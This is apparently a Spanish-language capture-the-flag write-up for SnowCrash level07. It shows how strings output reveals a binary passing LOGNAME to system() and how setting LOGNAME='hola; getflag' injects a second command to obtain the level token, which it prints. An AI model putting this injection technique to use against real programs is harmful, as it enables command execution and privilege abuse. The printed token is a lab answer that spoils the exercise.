1. **Busqueda de archivos**

    Ejecutando el programa solo muestra la salida `level07`, nada interesante por aqui, pero si miramos con `strings` encontramos algunas cosas
    ```bash
    strings level07
    [...]
    getenv
    LOGNAME
    /bin/echo %s
    system
    [...]
    ```
    1. Uso de variables de entorno y system()
        - Aparece getenv, LOGNAME y /bin/echo %s, lo que sugiere que el binario lee la variable de entorno LOGNAME y la pasa a un comando echo usando system().
    2. Funciones peligrosas
        - Se usan system, asprintf, getenv, lo que suele ser un vector de vulnerabilidad si el usuario controla el contenido de la variable de entorno.
    3. Ruta del código fuente
        - Aparece /home/user/level07/level07.c, lo que indica que el binario no está ofuscado y probablemente puedas encontrar el código fuente o deducir su lógica.
    4. Cadena sospechosa
        - zE&9qU podría ser una contraseña, flag o dato relevante
    
    El binario probablemente ejecute algo como:
    ```bash
    system("/bin/echo $LOGNAME");
    ``` 

2. **Explotacion**

    Si podemos modificar la variable de entorno podriamos inyectar comandos
    ```bash
    level07@SnowCrash:~$ LOGNAME='hola; getflag' ./level07
    hola
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
    ```
    
